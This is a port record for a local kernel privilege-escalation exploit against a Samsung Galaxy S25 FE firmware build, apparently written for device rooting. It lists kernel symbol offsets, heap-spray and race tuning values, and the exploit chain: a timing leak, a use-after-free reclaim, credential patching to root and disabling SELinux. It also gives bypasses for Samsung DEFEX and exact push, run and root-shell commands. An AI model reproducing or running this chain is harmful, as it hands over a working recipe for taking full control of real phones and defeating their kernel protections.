# Galaxy S25 FE SM-S731U1 / S731U1UES7BZF3 port record

This record documents the port of CVE-2026-43499 to the Galaxy S25 FE
(Exynos 2400 SoC, codename `r13s`, firmware `S731U1UES7BZF3`). The port
was completed over multiple sessions. The device achieves full root with
KernelSU late-load via the exploit's physrw primitive.

## Device identity

| Field | Value |
| --- | --- |
| Model | `SM-S731U1` |
| Codename | `r13s` (product `r13sue`) |
| SoC | Exynos 2400 (Samsung) |
| Display build | `BP4A.251205.006.S731U1UES7BZF3` |
| Build fingerprint | `samsung/r13sue/r13s:16/BP4A.251205.006/S731U1UES7BZF3_OYM7BZF3:user/release-keys` |
| Kernel release | `6.1.157-android14-11` |
| Kernel build | `#1 SMP PREEMPT Thu Jun 11 06:11:25 UTC 2026` |
| Android SDK | 36 (Android 16) |
| RAM | 8 GB |
| Page size | 4096 |
| ADB serial | `R5GL422W6MY` |

## Firmware extraction and symbols

Boot image extracted from Samsung AP package via `boot.img.lz4` → `boot.img`
→ raw ARM64 Image at 4096 alignment.

| Object | Size (bytes) |
| --- | --- |
| `boot.img` | 67,108,864 |
| Raw kernel | 38,832,640 |
| `vmlinux.elf` | 44,366,383 |
| `vmlinux.btf` | 5,998,390 |

Symbol recovery via `vmlinux-to-elf` at image base `0xffffffc008000000`.
BTF used to derive all structure layouts. `Module.symvers` extracted for
KernelSU module build.

## Target profile: `r13s-S731U1UES7BZF3`

Profile resides at `src/targets/r13s-S731U1UES7BZF3/target.h`.

### Physical memory layout

The Exynos 2400 in the S25 FE places main DRAM at physical `0x80000000`,
mapping to virtual `0xffffff8000000000` via the kernel's linear map.

```
P0_PAGE_OFFSET   = 0xffffff8000000000
P0_PHYS_OFFSET   = 0x80000000
DIRECT_MAP_BASE  = 0xffffff8000000000
DIRECT_MAP_END   = 0xffffff9000000000
VMEMMAP_START    = 0xfffffffe00000000
KIMAGE_TEXT_BASE = 0xffffffc008000000
```

### KASLR slide range

The kernel uses 64 KiB-aligned KASLR with slides from `0x000000` to
`0x1f0000` (32 candidates). The P0 fingerprint covers all 32 slides
with 8 probe words each, generated from the exact raw kernel Image.

### Key symbol offsets (6.1.157-android14-11)

| Symbol | Offset |
| --- | --- |
| `selinux_enforcing` | `0x025ea478` |
| `init_task` | `0x022ff840` |
| `root_task_group` | `0x02515cc0` |
| `sysctl_bootid` | `0x026cd5e0` |
| `call_usermodehelper_exec_work` | `0x000d4468` |
| `noop_llseek` | `0x003a1414` |
| `ashmem_fops` | `0x013d90c8` |
| `ashmem_misc` | `0x02484c20` |
| `kmalloc_caches` | `0x017a7a58` |
| `system_unbound_wq` | `0x022eae58` |

### Exploit tuning parameters

| Parameter | Value | Notes |
| --- | --- | --- |
| `APP_SLIDE_RECLAIM_SENDS` | 192 | SKB reclaim spray count |
| `APP_SLIDE_RECLAIM_SNDBUF` | 16,777,216 | 16 MiB socket buffer per SKB spray |
| `APP_KERNEL_PAGE_KSNITCH_IDENTITY_END` | `0xffffff8a00000000` | KernelSnitch search ceiling for 8 GB DRAM |
| `APP_RECLAIM_MAX_DIRECT_BASE` | `0xffffff8a00000000` | Reclaim address ceiling matching DRAM |
| `APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION` | 1 | Partition KernelSnitch threads to exact DRAM range |
| `DEFAULT_EXPLOIT_ATTEMPTS` | 24 | Max attempts per boot |
| `APP_REQUIRE_FRESH_P0_SESSION` | 1 | Each attempt consumes the P0 oracle state |
| `MM_STRUCT_SZ` | 0x400 | mm_struct slab object size |
| `MM_ORDER` | 3 | mm_struct slab page order |
| `KERNELSNITCH_MTE_ENABLED` | 1 | MTE tag handling required |

## KernelSU build

KernelSU `v3.2.5` with Samsung KDP/RKP/DEFEX patches, built against the
device's exact `Module.symvers` for KMI `android14-6.1`.

| Artifact | Path | Size |
| --- | --- | --- |
| Kernel module | `kernelsu/android14-6.1_kernelsu-r13s-S731U1UES7BZF3-kdp.ko` | — |
| ksud binary | `kernelsu/ksud-r13s-S731U1UES7BZF3-kdp` | 3,607,184 bytes |

The ksud binary embeds the matching `.ko` and is target-specific. It was built
with custom patches for `--ephemeral` mode (skips `/data/adb` staging) and
`--allow-shell` (passes `allow_shell=1` kernel module parameter).

## What worked

### The successful chain (attempt 4, third boot)

1. **Exploit trigger** (as shell user via ADB):
   ```
   adb shell "EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
     CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
     LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so \
     /system/bin/id"
   ```

2. **CVE-2026-43499 exploit** succeeds:
   - KernelSnitch leaks mm_struct address via futex hash collision timing
   - SKB reclaim lands on freed mm_struct page
   - rt_mutex priority inheritance race wins write window
   - fops data alias verified (pipe reclaim hit)
   - physrw primitive established via pipe page manipulation
   - Creds patched to uid=0, SELinux set to Permissive
   - Root daemon started via usermode helper (UMH)

3. **Root daemon** running at `uid=0(root) context=u:r:kernel:s0`:
   ```
   adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
   # uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
   ```

4. **KernelSU late-load** triggered:
   ```
   adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
   ```
   This forks a child that:
   - Creates private mount namespace
   - Bind-mounts ksud over `/system/bin/logcat`
   - Runs `logcat late-load --ephemeral --allow-shell --package-name me.weishu.kernelsu`
   - ksud loads `kernelsu.ko` with `allow_shell=1`
   - SELinux policies applied, returns to Enforcing
   - Verifies KernelSU control channel

5. **KernelSU root** via control channel:
   ```
   adb shell "echo 'id; exit' | /data/local/tmp/ksud-r13s-S731U1UES7BZF3-kdp debug su"
   # uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
   ```

### Verified final state

- `kernelsu` module loaded: `kernelsu 217088 0 - Live 0x0000000000000000 (O)`
- SELinux Enforcing: `1`
- KernelSU root context: `u:r:ksu:s0`
- Root via KernelSU control channel (ioctl-based, no filesystem dependency)

## What didn't work (and fixes)

### 1. DRAM range mismatch (fixed in session 1)

**Problem**: The initial target.h used address ceilings copied from a different
device with different RAM. The Exynos 2400 in the S25 FE has 8 GB DRAM starting
at physical `0x80000000`, mapping to virtual `0xffffff8800000000` through
`0xffffff8a00000000`. The original values (`0xffffff8900000000`) were too low,
causing KernelSnitch to miss mm_struct allocations in the upper DRAM range and
reclaim to skip valid pages.

**Symptom**: Consistent reclaim misses; KernelSnitch search threads couldn't
find mm_struct addresses above the ceiling.

**Fix**: Raised three values in target.h:
```c
#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8a00000000ULL
#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8a00000000ULL
```

### 2. Missing `--allow-shell` in late-load (fixed in session 2)

**Problem**: The `execl` call in `su_daemon.c` that triggers KernelSU
late-load was missing the `--allow-shell` argument. Without it, the KernelSU
kernel module loads without the `allow_shell=1` parameter, meaning the sucompat
hook does not redirect `su` for shell-domain callers (uid 2000).

**Discovery**: Found via upstream PR for the dm1q (SM-S911B) port which
explicitly documents this requirement.

**Symptom**: KernelSU would load but shell users couldn't obtain root through
the su redirect mechanism.

**Fix**: Added `"--allow-shell",` to the execl arguments in `su_daemon.c`:
```c
execl(LOGCAT_PATH, "logcat", "late-load", "--ephemeral",
      "--allow-shell",
      "--package-name", "me.weishu.kernelsu", (char *)NULL);
```

### 3. Samsung DEFEX Immutable Root v2 blocking /data/adb writes (fixed via --ephemeral)

**Problem**: Samsung's DEFEX (Device Exception Framework) Immutable Root v2
is a kernel-level security feature that blocks writes to `/data/adb/` even from
uid 0. Standard KernelSU late-load tries to copy `ksud` to `/data/adb/ksud`
(staging) and extract binaries to `/data/adb/ksu/bin/`, all of which are
blocked by DEFEX.

**Fix**: The ksud binary was rebuilt with `--ephemeral` support. In ephemeral
mode, `ksud` skips:
- `stage_daemon_from()` (no copy to `/data/adb/ksud`)
- `finish_install()` (no binary extraction to `/data/adb/ksu/bin/`)

The module still loads, SELinux policies are still applied, and the control
channel works. The tradeoff is that sucompat (execve redirect of `/system/bin/su`
→ `/data/adb/ksud`) cannot work because the file doesn't exist. Instead, root
is obtained via the KernelSU control channel ioctl directly.

### 4. sucompat path unavailable (worked around)

**Problem**: With `--ephemeral` mode, `/data/adb/ksud` doesn't exist, so the
kernel's sucompat hook (which redirects `execve("/system/bin/su")` to
`/data/adb/ksud`) has no target binary to exec.

**Workaround**: Use `ksud debug su` instead, which calls `grant_root()` via
the KernelSU control channel (`KSU_IOCTL_GRANT_ROOT`). This uses the magic
reboot syscall (`SYS_reboot` with `0xDEADBEEF`, `0xCAFEBABE`) to obtain a
control file descriptor, then ioctls to grant root. No filesystem writes needed.

### 5. Exploit probabilistic failures (expected behavior)

The exploit is inherently probabilistic. Several boot attempts may fail before
one succeeds:

- **Boot 1**: KASLR leak failed on attempt 1. P0 oracle consumed
  (`APP_REQUIRE_FRESH_P0_SESSION=1`), refusing unsafe retry. Must reboot.

- **Boot 2**: KASLR found on attempt 4 (slide=0x180000) but all 24 attempts
  had pipe reclaim misses (42 misses, 0 hits). The SKB spray never landed on
  the freed mm_struct page. This is bad luck with the SLAB allocator state.

- **Boot 3**: KASLR found (slide=0x40000), fops data alias verified, physrw
  established, root achieved on attempt 4. Full chain completed.

This is expected behavior — the same binary that fails one boot succeeds on
another. The exploit's success depends on kernel heap state which varies between
boots.

## Build artifacts

All three binaries on device at `/data/local/tmp/`:

| File | Size | Description |
| --- | --- | --- |
| `cve-2026-43499-app.so` | 140,912 | Exploit payload (LD_PRELOAD .so) |
| `cve-2026-43499-root` | 26,960 | Root helper daemon + client |
| `ksud-r13s-S731U1UES7BZF3-kdp` | 3,607,184 | KernelSU loader (target-specific) |

Build command:
```sh
ANDROID_NDK_HOME=/home/aayush/Android/Sdk/ndk/r27c make TARGET=r13s-S731U1UES7BZF3
```

## Deployment commands

### Push binaries to device
```sh
adb -s R5GL422W6MY push build/r13s-S731U1UES7BZF3/cve-2026-43499-app.so /data/local/tmp/
adb -s R5GL422W6MY push build/r13s-S731U1UES7BZF3/cve-2026-43499-root /data/local/tmp/
adb -s R5GL422W6MY push kernelsu/ksud-r13s-S731U1UES7BZF3-kdp /data/local/tmp/
adb -s R5GL422W6MY shell chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-r13s-S731U1UES7BZF3-kdp
```

### Run exploit (wait 120s after boot for quiet window)
```sh
adb -s R5GL422W6MY shell "EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so \
  /system/bin/id"
```

### Verify root (after exploit succeeds)
```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
# Expected: uid=0(root) gid=0(root) context=u:r:kernel:s0
```

### Trigger KernelSU late-load
```sh
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

### Verify KernelSU and get root
```sh
# Check module loaded
adb shell "echo 'cat /proc/modules | head -1; exit' | /data/local/tmp/ksud-r13s-S731U1UES7BZF3-kdp debug su"
# Expected: kernelsu 217088 0 - Live 0x0000000000000000 (O)

# Get root shell
adb shell "echo 'id; exit' | /data/local/tmp/ksud-r13s-S731U1UES7BZF3-kdp debug su"
# Expected: uid=0(root) gid=0(root) context=u:r:ksu:s0
```

## Notes

- The root daemon socket becomes inaccessible from shell after KernelSU loads
  (SELinux goes Enforcing). This is expected — use `ksud debug su` for root
  after that point.
- The exploit requires a fresh boot for each attempt series due to
  `APP_REQUIRE_FRESH_P0_SESSION=1`.
- MTE (Memory Tagging Extension) is active on this SoC; the exploit handles
  tagged pointers via `KERNELSNITCH_MTE_ENABLED=1`.
- The 120-second boot quiet window (`APP_MIN_BOOT_UPTIME_SEC`) must elapse
  before running the exploit to avoid interference from boot-time allocations.
- KernelSU Manager app (`me.weishu.kernelsu`) is not yet installed on the
  test device. It would show "Working (LKM)" status after late-load.
